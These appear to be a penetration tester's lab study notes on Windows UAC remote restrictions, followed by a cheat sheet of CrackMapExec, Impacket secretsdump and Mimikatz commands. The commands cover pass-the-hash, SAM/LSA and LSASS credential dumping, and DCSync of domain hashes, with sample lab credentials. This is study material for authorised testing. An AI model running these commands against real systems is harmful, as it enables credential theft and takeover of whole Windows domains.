**Windows UAC**  
UAC enforces principle of least priv when user authenticates by running as standard user elevation requiring a consent.  
hence if smb shell, escalation requires GUI to say Yes or bypass UAC.  
Blocks SMB/WMI/WINRM remote executions and lateral movements via local accounts   

CME checks if it can perform admin-level actions, e.g.:  Access ADMIN$ share, Execute commands via WMI/SMB and Dump SAM/LSA  

Case1: local account part of local admin group -  → NOT shown as “Pwned”  
UAC remote restrictions apply to local accounts  
When you authenticate remotely (_SMB/WMI/WinRM_): The access token is filtered and Admin privileges are stripped  
registry entry controlling this: LocalAccountTokenFilterPolicy 0 = UAC filterning ON(restricted) if this is 1 its high risk finding.  

Case2: Domain user in local Administrators → shown as “Pwned”  
Domain accounts are NOT subject to UAC remote restrictions  
When authenticated remotely: They receive a full admin token  

Case3: UAC is effectively disabled for the built-in Administrator  

**However** — still exploitable locally, If attacker gets shell on target: Local admin → full compromise possible.  
example: webshell/revshell+privesc  
problem is only for remote authentications  

**Crackmapexec**:  
crackmapexec smb -u soda -p soda 10.1.1.1/24 -x "type C:\flag.txt"  
crackmapexec smb 10.1.1.10/24 -u fcastle -d marvel.local -p Password1  //pass the password  
crackmapexec smb 10.1.1.0/24 -u adminisrator -H NTLM:HASH --local-auth  //local auth  
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auh --sam  //dump sam  
crackmapexec smb 10.1.1.10/24 -u adminisrator -H NTLM:HASH --local-auth --lsa  //dump lsa  
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auth -M --lsassy  //revels ntlm stored in lsas //valid on top of secretsdump   
crackmapexec smb 10.1.1.0/24 -u administrator -H NTLM:HASH --local-auth --shares   //list shares  
If local admin then see Pwn3d! in output against the target !!  
cmedb  //displays db of cme with stored info  
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'   //list readable files  
When completed, CME writes the results to a JSON file located at /tmp/cme_spider_plus/ipofhost  

  
**Impacket**: https://impacket.panekopanko.se/  
**Secretsdump**: works when cme doesn't work sometime against DC, because if user has dcsync perms this can still dump creds,  
however cme need local admin on target to dump !!  
secretsdump marvel.local/fcastle:'Password1'@10.1.1.1  //with domain user pass  
secretsdump administrator@10.1.1.1 -hashes NTLM:HASH   //local user hash //also reveals wdigest cleartext creds if any    
secretsdumpy.py marvel.local/pparker:'Password123'@10.1.1.1 -just-dc-ntlm   //dc Sync -- ntlm creds dump from NTDS.dit being domain admin    

**Mimikatz**: https://wadcoms.github.io/   https://hackviser.com/tactics/tools/mimikatz  
tool to steal creds, generate kerberos tickets, pass hash attacks, silver and golden ticket attacks  
Use it where possible – Windows only -- very powerfull !!  covers more than secretsdump and cme  

/usr/share/windows-resources/mimikatz  //even 1 file .exe will do  
Open cmd as administartor and execute the mimikatz.exe  

Privilege::debug  //debug mode  
sekurlsa::logonpasswords   //dump creds  
Instead of live dump, can also create a dump of Local Security Authority process from task manager and use it instead  
sekurlsa::minidump C:\Users\lsass.DMP  
